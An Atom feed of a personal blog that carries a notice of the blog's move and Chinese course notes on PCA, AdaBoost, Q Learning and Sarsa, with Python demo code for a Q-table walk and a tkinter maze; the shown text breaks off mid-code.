<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>B3ale</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="blog.b3ale.cn/"/>
  <updated>2021-01-07T10:07:59.721Z</updated>
  <id>blog.b3ale.cn/</id>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Moving on</title>
    <link href="blog.b3ale.cn/2020/10/12/Moving-on/"/>
    <id>blog.b3ale.cn/2020/10/12/Moving-on/</id>
    <published>2020-10-12T06:46:01.000Z</published>
    <updated>2021-01-07T10:07:59.721Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://www.b3ale.cn/" target="_blank" rel="noopener">New blog address</a></p><a id="more"></a><p>换博客，转战jekyll。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://www.b3ale.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;New blog address&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="life" scheme="blog.b3ale.cn/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>Feature Extraction and Selection</title>
    <link href="blog.b3ale.cn/2020/07/23/Feature-Extraction-and-Selection/"/>
    <id>blog.b3ale.cn/2020/07/23/Feature-Extraction-and-Selection/</id>
    <published>2020-07-23T07:15:45.000Z</published>
    <updated>2020-09-27T09:01:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>特征提取与特征选择。</p><a id="more"></a><h1 id="Feature-Extraction-and-Selection"><a href="#Feature-Extraction-and-Selection" class="headerlink" title="Feature Extraction and Selection"></a>Feature Extraction and Selection</h1><p>特征提取问题：</p><p>有一串向量，$\{x_1,x_2,\cdots,x_p\}$，其中 $x_i=\{x_{i1},x_{i2},\cdots,x_{xN}\}$，每一个 $x_i$ 属于 $C_1$ 或 $C_2$。如果构造一个降维函数 $\{f_1(x_{i1}\sim x_{iN}),f_2(x_{i1}\sim x_{iN}),\cdots,f_M(x_{i1}\sim x_{iN})\}$，使其保留最大的可分类信息？</p><p>特征选择问题：</p><p>有一串向量，$x_1,x_2,\cdots,x_p$，其中 $x_i=\{x_{i1},x_{i2},\cdots,x_{xN}\}$，每一个 $x_i$ 属于 $C_1$ 或 $C_2$。$N$ 个维度有冗余，如何从 $N$ 个维度中选取 $M$ 个维度（$M≤N$），使得识别率最高？</p><h2 id="主成分分析（Principle-Component-Analysis）"><a href="#主成分分析（Principle-Component-Analysis）" class="headerlink" title="主成分分析（Principle Component Analysis）"></a>主成分分析（Principle Component Analysis）</h2><p>主成分分析由卡尔·皮尔逊于 1901 年发明，用于分析数据及建立数理模型。</p><p>构造一个 $A$、$b$，使 $Y=Ax+b$，其中 $Y$ 是一个 Mx1 的矩阵，$X$ 是一个 Nx1 的矩阵，$A$ 是一个 MxN 的矩阵，$b$ 是一个 Mx1 的矩阵。即将 $X$ 由 N 维降至 M 维。故主成分分析可以看成是一个一层的有 M 个神经元的神经网络，且其中 $x$ 是没有标签（Label）的，和自编码器类似。</p><p>PCA 的做法：寻找使方差最大的方向，并在该方向上投影。最大限度地保存了训练样本的能量。</p><p><img src="/pics/Feature-Extraction-and-Selection/1.png" srcset="/img/loading.gif" alt></p><p>$$<br>\begin{cases}<br>Y=A(x-\bar{x}) &amp; b=-A\bar{x}\\<br>\bar{x}=E(x)=\frac{1}{P}\sum_{p=1}^Px_p &amp; \bar{x} 为x的均值<br>\end{cases}<br>$$</p><p>在 $Y=A(x-\bar{x})$ 中，$Y$ 是一个 Mx1 的矩阵，$A$ 是一个 MxN 的矩阵，$x$ 和 $\bar{x}$ 都是 Nx1 的矩阵。将 $A$ 写成行向量的形式，其中每个 $a_i$ 代表一个投影的方向：</p><p>$$<br>A=\begin{bmatrix}<br>a_1\\<br>a_2\\<br>\vdots\\<br>a_n<br>\end{bmatrix}<br>$$</p><p>那么 $Y$ 可以写成如下形式：</p><p>$$<br>Y_i=\begin{bmatrix}<br>a_1(x_i-\bar{x})\\<br>a_2(x_i-\bar{x})\\<br>\vdots\\<br>a_n(x_i-\bar{x})<br>\end{bmatrix}<br>=\begin{bmatrix}<br>y_{i1}\\<br>y_{i2}\\<br>\vdots\\<br>y_{iM}<br>\end{bmatrix}<br>(i=1\sim P)<br>$$</p><p>假设训练样本 $\{x_i\}<em>{i=1\sim P}$。计算 $\bar{y</em>{i1}}$ 的值如下：</p><p>$$<br>\begin{array}{l}<br>\bar{y_{i1}}=\frac{1}{P}\sum_{i=1}^Py_{i1}\\<br>\quad =\frac{1}{P}\sum_{i=1}^Pa_1(x_i-\bar{x})\\<br>\quad =\frac{a_1}{P}(\sum_{i=1}^Px_i-P\bar{x})=0<br>\end{array}<br>$$</p><p>最大化（其中 $\Sigma$ 是协方差矩阵）：</p><p>$$<br>\begin{array}{l}<br>\sum_{i=1}^P(y_{i1}-\bar{y_{i1}})^2=\sum_{i=1}^Py_{i1}^2\\<br>\quad\quad\quad\quad\quad\quad =\sum_{i=1}^P[a_1(x_i-\bar{x})]^2\\<br>\quad\quad\quad\quad\quad\quad =\sum_{i=1}^P[a_1(x_i-\bar{x})][a_1(x_i-\bar{x})]^T\\<br>\quad\quad\quad\quad\quad\quad =\sum_{i=1}^Pa_1[(x_i-\bar{x})(x_i-\bar{x})^T]a_1^T\\<br>\quad\quad\quad\quad\quad\quad =a_1[\sum_{i=1}^P(x_i-\bar{x})(x_i-\bar{x})^T]a_1^T\\<br>\quad\quad\quad\quad\quad\quad =a_1\Sigma a_1^T &amp; (\Sigma=\sum_{i=1}^P(x_i-\bar{x})(x_i-\bar{x})^T<br>\end{array}<br>$$</p><p>最终得到最大化优化问题如下：</p><ul><li>最大化：$a_1\Sigma a_1^T$</li><li>限制条件：$a_1a_1^T=\lVert a_1\rVert^2=1$</li></ul><p>拉格朗日乘子法：</p><p>$$<br>\begin{array}{l}<br>E(a_1)=a_1\Sigma a_1^T-\lambda(a_1a_1^T-1)\\<br>\frac{\partial E}{\partial a_1}=(\Sigma a_1^T-\lambda a_1^T)^T=0<br>\end{array}<br>$$</p><p>因此：</p><p>$$<br>\begin{array}{l}<br>\Sigma a_1^T=\lambda a_1^T &amp; （a_1^T是\Sigma的特征向量，\lambda是\Sigma的特征值）\\<br>a_1(\Sigma a_1^T)=a_1(\lambda a_1^T)=\lambda(a_1a_1^T)=\lambda<br>\end{array}<br>$$</p><p>故可以得出 $\lambda$ 是 $\Sigma$ 最大的特征值，$a_1$ 是 $\Sigma$ 最大特征值对应的特征向量，且 $a_1a_1^T=1$。</p><p>改造优化问题：</p><ul><li>最大化：$a_2\Sigma a_2^T$</li><li>限制条件：<ul><li>$a_2a_2^T=\lVert a_2\rVert^2=1$；</li><li>$a_2a_1^T=a^1a_2^T=0$，即 $a_1$ 与 $a_2$ 正交。</li></ul></li></ul><p>拉格朗日乘子法：</p><p>$$<br>\begin{array}{l}<br>E(a_2)=a_2\Sigma a_2^T-\lambda(a_2a_2^T)-\beta a_1a_2^T\\<br>\frac{\partial E}{\partial a_2}=(\Sigma a_2^T-\lambda a_2^T-\beta a_1^T)^T=0\\<br>\Sigma a_2^T-\lambda a_2^T-\beta a_1^T=0<br>\end{array}<br>$$</p><p>证明 $\beta=0$：</p><p>$$<br>\begin{array}{cc}<br>(\Sigma a_2^T-\lambda a_2^T-\beta a_1^T)^T=0\\<br>a_2\Sigma^T-\lambda a_2-\beta a_1=0<br>\end{array}<br>$$</p><p>因为 $\Sigma$ 是一个对称阵，即 $\Sigma=\Sigma^T$，得到：</p><p>$$<br>\begin{array}{cc}<br>a_2\Sigma-\lambda a_2-\beta a_1=0\\<br>a_2(\Sigma a_1^T)-\lambda(a_2a_1^T)-\beta a_1a_1^T=0\\<br>a_2\lambda_1a_1^T-0-\beta=0\\<br>\lambda_1 a_2a_1^T-\beta=0\\<br>\beta=0<br>\end{array}<br>$$</p><p>由于 $\beta=0$，故有：</p><p>$$<br>\begin{cases}<br>\Sigma a_2^T=\lambda a_2^T\\<br>a_2a_2^T=1\\<br>a_2\Sigma a_2^T=\lambda<br>\end{cases}<br>$$</p><p>所以 $a_2$ 是 $\Sigma$ 的特征向量，$\lambda$ 是 $\Sigma$ 的第二大的特征值。以此类推，同理可以得到 $a_3$ 是 $\Sigma$ 第三大特征值特征向量；$a_4$ ……；$a_5$ ……</p><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>PCA 算法总结如下：</p><ol><li>求协方差矩阵：$\Sigma=\sum_{i=1}^P(x_i-\bar{x})(x_i-\bar{x})^T$；</li><li>求协方差矩阵 $\Sigma$ 的特征值，并从大到小排序：$[\lambda_1,\lambda_2,\cdots,\lambda_M,\lambda_{M+1},\cdots]$，对应的特征向量：$[a_1^T,a_2^T,\cdots,a_M^T,a_{M+1}^T,\cdots]$；</li><li>归一化所有 $a_i$，使 $a_ia_i^T=1$；</li><li>$A=\begin{bmatrix}a_1\\ a_2\\ \cdots\\ a_M\end{bmatrix}$；</li><li>降维：$Y_i=A(x_i-\bar{x})$，其中 $(i=1\sim P)$。</li></ol><blockquote><p>相关：SVD（Singular Value Decomposition）</p></blockquote><h2 id="自适应提升算法（AdaBoost）"><a href="#自适应提升算法（AdaBoost）" class="headerlink" title="自适应提升算法（AdaBoost）"></a>自适应提升算法（AdaBoost）</h2><p>自适应增强是一种机器学习方法，由 Yoav Freund 和 Robert Schapire 于 1995 年提出。</p><p>特征选择：$x=\begin{bmatrix}x_1\\ x_2\\ \cdots\\ x_N\end{bmatrix}$，从 N 个特征中选 M 个使识别率最高。共有 $C_N^M=\frac{N!}{M!(N-M)!}$ 种选法。启发式方法：</p><ol><li>递增法；</li><li>递减法。</li></ol><p>数据集 $T=\{(x_1,y_1),\cdots,(x_N,y_N)\}$，二分类问题：$y_i=\{-1,+1\}$。AdaBoost 算法流程：</p><ul><li>输入：$T=\{(x_i,y_i)\}_{i=1\sim N}$；</li><li>输出：分类器 $G(x)=±1$。</li></ul><ol><li>初始化采样权值：$D_1=(\omega_{11},\omega_{12},\omega_{13},\cdots,\omega_{1N})$，且 $\omega_{1i}=\frac{1}{N}$，其中 $i=1\sim N$；</li><li>对 $m=1,2,\cdots,M$（$M$ 是弱分类器个数），用 $D_M$ 采样 $N$ 个训练样本，在训练样本上获得弱分类器 $G_m(x)=±1$；</li><li>计算加权错误率：$\begin{array}{l}e_m=P(G_m(x_i)≠y_i)=\sum_{i=1}^N\omega_{m_i}I(G_m(x_i)≠y_i) &amp; e_m&lt;\frac{1}{2}\end{array}$，识别器 $G_m(x_i)$ 的权重为 $\begin{array}{l}\alpha_m=\frac{1}{2}\log\frac{1-e_m}{e_m} &amp; \alpha_m&gt;0\end{array}$；</li><li>更新权值分布：$D_{m+1}=\{\omega_{m+1,1},\omega{m+1,2},\cdots,\omega_{m+1,N}\}$，其中 $\begin{cases}\omega_{m+1,i}=\frac{\omega_{mi}}{Z_m}e^{-\alpha_my_iG_m(x_i)}\\ Z_m=\sum_{i=1}^N\omega_{mi}e^{-\alpha_my_iG_m(x_i)}\end{cases}$；</li><li>回到 2；</li><li>定义 $f(x)=\sum_{m=1}^M\alpha_mG_m(x)$，得到最终识别器 $G(x)=sign(f(x))=sign[\sum_{m=1}^M\alpha_mG_m(x)]$。</li></ol><p>定理：随着 $M$ 增加，AdaBoost 最终的分类器 $G(x)$ 在训练样本上的错误将会越来越小。</p><ul><li>错误率：$\begin{array}{l}E=\frac{1}{N}\sum_{i=1}^NI(G(x_i)≠y_i)≤\frac{1}{N}\sum_{i=1}^Ne^{-y_if(x_i)}\\ \quad=\Pi_{m=1}^MZ_m\end{array}$；</li><li>$\begin{array}{l}E≤\frac{1}{N}\sum_{i=1}^Ne^{-\sum_{m=1}^M\alpha_my_iG_m(x_i)}\\ \quad=\sum_{i=1}^N\omega_{1i}\Pi_{m=1}^Me^{-\alpha_my_iG_m(x_i)}\\ \quad=\sum_{i=1}^M[\omega_{1i}e^{-\alpha_1y_iG_1(x_i)}][\Pi_{m=2}^Me^{-\alpha_my_iG_m(x_i)}]\\ \quad=\sum_{i=1}^M[\omega_{2i}Z_i][\Pi_{m=2}^Me^{-\alpha_my_iG_m(x_i)}]\\ \quad=Z_1\sum_{i=1}^M\omega_{2i}[\Pi_{m=2}^Me^{-\alpha_my_iG_m(x_i)}]\\ \quad=\Pi_{m=1}^MZ_m\end{array}$</li></ul><p>证明：$Z_m=2\sqrt{e_m(1-e_m)}$</p><p>$$<br>\begin{array}{l}<br>Z_m=\sum_{i=1}^N\omega_{mi}e^{-\alpha_my_iG_m(x_i)}\\<br>\quad=\sum_{i=1\And y_i=G_m(x_i)}^N\omega_{mi}e^{-\alpha_m}+\sum_{i=1\And y_i≠G_m(x_i)}^N\omega_{mi}e^{\alpha_m}\\<br>\quad=(1-e_m)e^{-\alpha_m}+e_me^{\alpha_m}<br>\end{array}<br>$$</p><p>将 $\alpha_m=\frac{1}{2}\log\frac{1-e_m}{e_m}$ 代入，得：</p><p>$$<br>Z_m≤2\sqrt{e_m(1-e_m)}<br>$$</p><p>若 $e_m&lt;\frac{1}{2}$，则 $Z_m&lt;1$。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p>浙江大学信电学院《机器学习》课程</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;特征提取与特征选择。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ml" scheme="blog.b3ale.cn/tags/ml/"/>
    
  </entry>
  
  <entry>
    <title>Reiforcement Learning</title>
    <link href="blog.b3ale.cn/2020/07/20/%5BTODO%5DReiforcement-Learning/"/>
    <id>blog.b3ale.cn/2020/07/20/%5BTODO%5DReiforcement-Learning/</id>
    <published>2020-07-20T07:15:45.000Z</published>
    <updated>2020-07-24T02:30:53.000Z</updated>
    
    <content type="html"><![CDATA[<p>无监督的强化学习。</p><a id="more"></a><h1 id="强化学习与监督学习的区别"><a href="#强化学习与监督学习的区别" class="headerlink" title="强化学习与监督学习的区别"></a>强化学习与监督学习的区别</h1><ol><li>训练数据中没有标签，只有奖励函数（Reward Function）；</li><li>训练数据不是现成给定的，而是由行为（Action）获得；</li><li>现在的行为（Action）不仅影响后续训练数据的获得，也影响奖励函数（Reward Function）的取值；</li><li>训练的目的是构建一个“状态-&gt;行为”的函数，其中状态（State）描述了目前内部和外部的环境，在此情况下，要使一个智能体（Agent）在某个特定的状态下，通过这个函数决定此时应该采取的行为。希望采取这些行为后，最终获得最大的奖励函数值。</li></ol><h2 id="强化学习相关算法"><a href="#强化学习相关算法" class="headerlink" title="强化学习相关算法"></a>强化学习相关算法</h2><ul><li>通过价值选行为（Model-Free）；<ul><li>Q learning（基于价值）</li><li>Sarsa（基于价值）</li><li>Deep Q Network</li></ul></li><li>直接选行为；<ul><li>Policy Gradients（基于概率）</li></ul></li><li>想象环境并从中学习。<ul><li>Model based RL</li></ul></li></ul><h1 id="Q-Learning"><a href="#Q-Learning" class="headerlink" title="Q Learning"></a><a href="https://blog.csdn.net/qq_30615903/article/details/80739243" target="_blank" rel="noopener">Q Learning</a></h1><p>Q Learning 是强化学习算法中基于价值的算法。</p><p>$$<br>\begin{array}{l}<br>Initialize\ Q(s,a)\ arbitrarily\\<br>Repeat\ (for\ each\ episode):\\<br>\quad Initialize\ S\\<br>\quad Repeat\ (for\ each\ step\ of\ episode):\\<br>\quad\quad Choose\ A\ from\ S\ using\ policy\ derived\ from\ Q\ (e.g.,\varepsilon-greedy)\\<br>\quad\quad Take\ action\ A,\ observe E,\ S’\\<br>\quad\quad Q(S,A)\leftarrow Q(S,A)+\alpha[R+\gamma\max_aQ(S’,a)-Q(S,A)]\\<br>\quad\quad S\leftarrow S’;\\<br>\quad until\ S\ is\ terminal<br>\end{array}<br>$$</p><h2 id="马尔可夫假设"><a href="#马尔可夫假设" class="headerlink" title="马尔可夫假设"></a>马尔可夫假设</h2><p>假设状态数有限，行为数有限：</p><ul><li>$R_t$：$t$ 时刻的奖励函数值；</li><li>$S_t$：$t$ 时刻的状态；</li><li>$A_t$：$t$ 时刻的行为。</li><li>下一时刻的状态只与当前时刻状态有关，与其他状态无关：$\mathbb{P}[S_{t+1}\vert S_t]=\mathbb{P}[S_{t+1}\vert S_1,\cdots,S_t]$；</li><li>下一个时刻的状态只与这一时刻的状态以及这一时刻的行为有关：$P_{ss’}^a=\mathbb{P}[S_{t+1}=s’\vert S_t=s,A_t=a]$；</li><li>下一时刻的奖励函数值只与这一时刻的状态及这一时刻的行为有关：$R_s^a=\mathbb{E}[R_{t+1}\vert S_t=s,A_t=a]$。</li></ul><h2 id="Markov-Decision-Process（MDP）"><a href="#Markov-Decision-Process（MDP）" class="headerlink" title="Markov Decision Process（MDP）"></a>Markov Decision Process（MDP）</h2><ol><li>在 $t=0$ 的时候，环境给出一个初始状态 $s_0\sim p(s_0)$；</li><li>需要学习一个策略（Policy）$\pi^*$，这是一个从状态到行为的映射函数，使得最大化累积的奖励。<ul><li>智能体选择行为 $a_t$；</li><li>环境采样奖励函数 $r_t\sim E(r_t\vert s_t,a_t)$；</li><li>环境产生下一个状态 $s_{t+1}\sim P(s_{t+1}\vert s_t,a_t)$；</li><li>智能体获得奖励函数 $r_t$ 和下一个状态 $s_{t+1}$。</li></ul></li></ol><h2 id="待优化目标函数"><a href="#待优化目标函数" class="headerlink" title="待优化目标函数"></a>待优化目标函数</h2><p>增强学习中的待优化目标函数是累计奖励，即一段时间内的奖励函数加权平均值（$\gamma$ 是一个衰减项，$0&lt;\gamma&lt;1$）：</p><p>$$<br>G_t=R_{t+1}+\gamma R_{t+2}+\cdots=\sum_{k=0}^\infty\gamma^kR_{t+k+1}<br>$$</p><p>需要学习的函数只有 $\pi^*$，即一个状态-&gt;行为的映射：</p><p>$$<br>\pi(s_t,a_t)=p(a_t\vert s_t)<br>$$</p><p>根据一个决策机制（Policy），可以获得一条路径：</p><p>$$<br>s_0,a_0,r_0,s_1,a_1,r_1,\cdots<br>$$</p><p>估值函数（Value Function）是衡量某个状态最终能获得多少累计奖励的函数：</p><p>$$<br>V^\pi(s)=\mathbb{E}[\sum_{t=0}^{+\infty}\gamma^tr_t\vert s_0=s,\pi]<br>$$</p><p>Q 函数是衡量某个状态下采取某个行为后，最终能获得多少积累奖励的函数：</p><p>$$<br>Q^\pi(s,a)=\mathbb{E}[\sum_{t=0}^{+\infty}\gamma^tr_t\vert s_0=s,a_0=a,\pi]<br>$$</p><p>有以下公式：</p><p>$$<br>\begin{array}{cc}<br>\pi(s,a)=p(a\vert s)\\<br>Q^\pi(s,a)=\sum_{S’\in S}P_{SS’}^a(R_S^a+\gamma V^\pi(S’))\\<br>\pi(S,a)=\begin{cases}1, &amp; 若a=\max_{a\in A}\ Q(S,a)\\ 2, &amp;其他\end{cases}<br>\end{array}<br>$$</p><p>得出估值函数和 Q 函数之间的关系：</p><p>$$<br>\begin{array}{l}<br>V^\pi(s)=E_\pi(\sum_{t=0}^{+\infty}\gamma^tr_t\vert s_0=s,\pi)\\<br>\quad\quad=E_\pi(r_0+\gamma\sum_{t=0}^{+\infty}\gamma^tr_{t+1}\vert s_0=s,\pi)\\<br>\quad\quad=\sum_{a\in A}\pi(s,a)\sum_{s’\in s}P_{ss’}^a(R_s^a+\gamma V^\pi(s’))\\<br>\quad\quad=\sum_{a\in A}p(a\vert s)Q^\pi(s,a)<br>\end{array}<br>$$</p><p>即：</p><p>$$<br>V^\pi(s)=\sum_{a\in A}\pi(s,a)Q^\pi(s,a)<br>$$</p><p>通过上式，并使用迭代的方式每次对 Q 值（$\pi(s,a)$，即在状态 $s$ 下执行动作 $a$ 的概率）进行更新，最终可以求出最佳策略 $\pi$。</p><h2 id="Shortcomings"><a href="#Shortcomings" class="headerlink" title="Shortcomings"></a>Shortcomings</h2><p>对于状态数和行为数很多的时候，这种做法不现实。</p><h2 id="Programming"><a href="#Programming" class="headerlink" title="Programming"></a>Programming</h2><p>下面模拟一下 Q Learning 的学习过程：</p><pre><code class="python">#!/usr/bin/env python3import numpy as npimport pandas as pdimport timeimport sysif len(sys.argv) == 2 and sys.argv[1] == &#39;SET_SEED&#39;:    seed = int(input(&#39;Input seed: &#39;))    np.random.seed(seed)NSTATES = 6ACTIONS = [&#39;left&#39;, &#39;right&#39;]EPSILON = 0.9 # greedy policyALPHA = 0.1 # learning rateLAMBDA = 0.9 # discount factorMAX_EPSODES = 13FRESH_TIME = 0.01def buildQTable(nStates, actions): # 创建Q表    table = pd.DataFrame(        np.zeros((nStates, len(actions))),        columns=actions, # 纵坐标为Actions    )    print(table)    return tabledef chooseAction(state, qTable): # 随机选择Action    stateActions = qTable.iloc[state, :]    if np.random.rand() &gt; EPSILON or stateActions.all() == False: # 命中了10%的概率或是表中所有Actions的值都为0，随机选择下一个Action        actionName = np.random.choice(ACTIONS)    else: # 反之取值最大的Action作为下一个选择        actionName = stateActions.idxmax()    return actionNamedef getEnvFeedback(S, A): # 通过当前状态和行为获取下一状态和奖励函数值    if A == &#39;right&#39;: # 如果Action为向右走        if S == NSTATES - 2: # 如果当前状态在目的地左侧1个位置            S_ = &#39;terminate&#39; # 下一个状态设为终止            R = 1 # 奖励函数值设为1        else:            S_ = S + 1 # 下一状态设为当前状态+1            R = 0 # 奖励函数值为0    else: # 如果Action为向左走        R = 0 # 向左走不会到目的地，奖励函数值设为0        if S == 0: # 如果已经在最左侧            S_ = S # 下一状态不变        else:            S_ = S - 1 # 下一状态设为当前状态-1    return S_, Rdef updateEnv(S, episode, stepCounter): # 更新环境    envList = [&#39;-&#39;] * (NSTATES - 1) + [&#39;T&#39;] # 初始化环境    if S == &#39;terminate&#39;: # 如果状态为终止        interaction = &#39;Episode %s: total_steps = %s&#39; % (episode + 1, stepCounter)        print(&#39;\r{}&#39;.format(interaction))        time.sleep(0.5)    else:        envList[S] = &#39;M&#39; # 更新当前位置        interaction = &#39;&#39;.join(envList)        print(&#39;\r{}&#39;.format(interaction), end=&#39;&#39;)        time.sleep(FRESH_TIME)def rl(): # 增强学习训练函数    qTable = buildQTable(NSTATES, ACTIONS) # 创建Q表    for episode in range(MAX_EPSODES): # 循环训练        stepCounter = 0        S = 0        isTerminated = False        updateEnv(S, episode, stepCounter) # 初始化环境        while not isTerminated:            A = chooseAction(S, qTable) # 选择Action            S_, R = getEnvFeedback(S, A) # 获取下一个状态和当前奖励函数值            qPred = qTable.loc[S, A] # 获取预测的Q值            if S_ != &#39;terminate&#39;: # 如果没有到达目的地                qTarget = R + LAMBDA * qTable.iloc[S_, :].max() # 计算实际的Q值            else:                qTarget = R                isTerminated = True            qTable.loc[S, A] += ALPHA * (qTarget - qPred) # 更新Q值            S = S_ # 更新当前状态            updateEnv(S, episode, stepCounter + 1) # 更新环境            stepCounter += 1    return qTableif __name__ == &#39;__main__&#39;:    qTable = rl()    print(qTable)</code></pre><p>因为存在贪婪系数（Greedy Policy），在实际测试时可能有 10% 的概率随机选择行为，导致最后的结果有一些浮动：</p><pre><code class="bash">$ ./Q-Learning-1.py   left  right0   0.0    0.01   0.0    0.02   0.0    0.03   0.0    0.04   0.0    0.05   0.0    0.0Episode 1: total_steps = 34Episode 2: total_steps = 7Episode 3: total_steps = 7Episode 4: total_steps = 5Episode 5: total_steps = 6Episode 6: total_steps = 8Episode 7: total_steps = 7Episode 8: total_steps = 5Episode 9: total_steps = 5Episode 10: total_steps = 5Episode 11: total_steps = 5Episode 12: total_steps = 5Episode 13: total_steps = 5       left     right0  0.000002  0.0052131  0.000026  0.0271332  0.000139  0.1117243  0.000139  0.3433314  0.000810  0.7458135  0.000000  0.000000</code></pre><h2 id="Off-policy"><a href="#Off-policy" class="headerlink" title="Off-policy"></a>Off-policy</h2><p>Q Learning 是典型的 Off-policy 算法，其生成样本的 Policy（Value Function）跟网络更新参数时使用的 Policy（Value Function）不同，计算下一状态的预期收益时通过 MAX 函数直接选择最优动作，而当前 Policy 并不一定能选择到最优动作。先产生某概率分布下的大量行为数据（Behavior Policy），意在探索。从这些偏离（Off）最优策略的数据中寻求 Target Policy。</p><p>劣势是曲折，收敛慢，但优势是确保了数据全面性，所有行为都能覆盖。</p><h1 id="Sarsa"><a href="#Sarsa" class="headerlink" title="Sarsa"></a><a href="https://zhuanlan.zhihu.com/p/29283927" target="_blank" rel="noopener">Sarsa</a></h1><p>Sarsa 算法和 Q Learning 很像，也是基于 Q 表实现。</p><p>$$<br>\begin{array}{l}<br>Initialize\ Q(s,a)\ arbitrarily\\<br>Repeat\ (for\ each\ episode):\\<br>\quad Initialize\ S\\<br>\quad Choose\ A\ from\ S\ using\ policy\ derived\ from\ Q\ (e.g.,\varepsilon-greedy)\\<br>\quad Repeat\ (for\ each\ step\ of\ episode):\\<br>\quad\quad Take\ action\ A,\ observe\ E,\ S’\\<br>\quad\quad Choose\ A’\ from\ S’\ using\ policy\ derived\ from\ Q\ (e.g.,\varepsilon-greedy)\\<br>\quad\quad Q(S,A)\leftarrow Q(S,A)+\alpha[R+\gamma Q(S’,A’)-Q(S,A)]\\<br>\quad\quad S\leftarrow S’;\ A\leftarrow A’;\\<br>\quad until\ S\ is\ terminal<br>\end{array}<br>$$</p><p>在更新 Q 表的时候，Sarsa 选择的策略与上一个策略一样，执行完当前行为 Action 后，再更新 Q 值。</p><h2 id="Programming-1"><a href="#Programming-1" class="headerlink" title="Programming"></a>Programming</h2><p>测试由 tkinter 库实现的走迷宫小程序，使用 Sarsa 算法在避开陷阱的同时找到最优路径：</p><pre><code class="python">#!/usr/bin/env python3import numpy as npimport pandas as pdimport tkinter as tkimport timeUNIT = 40 # pixelsMAZE_H = 4 # grid heightMAZE_W = 4 # grid widthclass Maze(tk.Tk, object): # 环境类    def __init__(self):        super(Maze, self).__init__()        self.actionSpace = [&#39;up&#39;, &#39;down&#39;, &#39;left&#39;, &#39;right&#39;]        self.nActions = len(self.actionSpace)        self.title(&#39;maze&#39;)        self.geometry(&#39;{0}x{1}&#39;.format(MAZE_H * UNIT, MAZE_W * UNIT))        self.buildMaze()    def buildMaze(self):        self.canvas = tk.Canvas(self, bg=&#39;white&#39;, height=MAZE_H * UNIT, width=MAZE_W * UNIT)        for c in range(0, MAZE_W * UNIT, UNIT):            x0, y0, x1, y1 = c, 0, c, MAZE_H * UNIT            self.canvas.create_line(x0, y0, x1, y1)        for r in range(0, MAZE_H * UNIT, UNIT):            x0, y0, x1, y1 = 0, r, MAZE_W * UNIT, r            self.canvas.create_line(x0, y0, x1, y1)        origin = np.array([20, 20])        # hell        hell1Center = origin + np.array([UNIT * 2, UNIT])        self.hell1 = self.canvas.create_rectangle(hell1Center[0] - 15, hell1Center[1] - 15, hell1Center[0] + 15, hell1Center[1] + 15, fill=&#39;black&#39;)        # hell        hell2Center = origin + np.array([UNIT, UNIT * 2])        self.hell2 = self.canvas.create_rectangle(hell2Center[0] - 15, hell2Center[1] - 15, hell2Center[0] + 15, hell2Center[1] + 15, fill=&#39;black&#39;)        # oval        ovalCenter = origin + UNIT * 2        self.oval = self.canvas.create_rectangle(ovalCenter[0] - 15, ovalCenter[1] - 15, ovalCenter[0] + 15, ovalCenter[1] + 15, fill=&#39;yellow&#39;)        # rect        self.rect = self.canvas.create_rectangle(origin[0] - 15, origin[1] - 15, origin[0] + 15, origin[1] + 15, fill=&#39;red&#39;)        self.canvas.pack()    def reset(self):        self.update()        time.sleep(0.5)        self.canvas.delete(self.rect)        origin = np.array([20, 20])        self.rect = self.canvas.create_rectangle(origin[0] - 15, origin[0] - 15, origin[0] + 15, origin[0] + 15, fill=&#39;red&#39;)        return self.canvas.coords(self.rect)    def step(self, action):        s = self.canvas.coords(self.rect)        baseAction = np.array([0, 0])        if action == 0:            if s[1] &gt; UNIT:                baseAction[1] -= UNIT        elif action == 1:            if s[1] &lt; (MAZE_H - 1) * UNIT:                baseAction[1] += UNIT        elif action == 2:            if s[0] &lt; (MAZE_W - 1) * UNIT:                baseAction[0] += UNIT        elif action == 3:            if s[0] &gt; UNIT:                baseAction[0] -= UNIT        self.canvas.move(self.rect, baseAction[0], baseAction[1])        s_ = self.canvas.coords(self.rect)        if s_ == self.canvas.coords(self.oval):            reward = 1            isDone = True            s_ = &#39;terminated&#39;        elif s_ in [self.canvas.coords(self.hell1), self.canvas.coords(self.hell2)]:            reward = -1            isDone = True            s_ = &#39;terminated&#39;        else:            reward = 0            isDone = False        return s_, reward, isDone    def render(self):        time.sleep(0.1)        self.update()class RL(object): # 增强学习类    def __init__(self, actions, learningRate=0.01, rewardDecay=0.9, greedyPolicy=0.9):        self.actions = actions        self.lr = learningRate # 学习率        self.gamma = rewardDecay # 衰减项        self.epsilon = greedyPolicy # 贪婪系数        self.qTable = pd.DataFrame(columns=self.actions, dtype=np.float64)    def checkStateExists(self, state): # 检查状态State是否存在        if state not in self.qTable.index:            self.qTable = self.qTable.append(pd.Series([0] * len(self.actions), index=self.qTable.columns, name=state))    def chooseAction(self, observation): # 选择行为Action        self.checkStateExists(observation)        if np.random.rand() &lt; self.epsilon:            stateAction = self.qTable.loc[observation, :]            action = np.random.choice(stateAction[stateAction == np.max(stateAction)].index) # 选择Q值最大的行为Action        else: # 10%的概率随机选择行为Action            action = np.random.choice(self.actions)        return action    def learn(self, *args): # 学习函数        passclass SarsaTable(RL):    def __init__(self, actions, learningRate=0.01, rewardDecay=0.9, greedyPolicy=0.9):        super(SarsaTable, self).__init__(actions, learningRate, rewardDecay, greedyPolicy)    def learn(self, s, a, r, s_, a_):        self.checkStateExists(s_) # 检测得到的下一个状态State是否存在        qPred = self.qTable.loc[s, a]        if s_ != &#39;terminated&#39;: # 如果没有终止            qTarget = r + self.gamma * self.qTable.loc[s_, a_] # 计算新的Q值        else: # 状态终止            qTarget = r        self.qTable.loc[s, a] += self.lr * (qTarget - qPred) # 更新Q值def 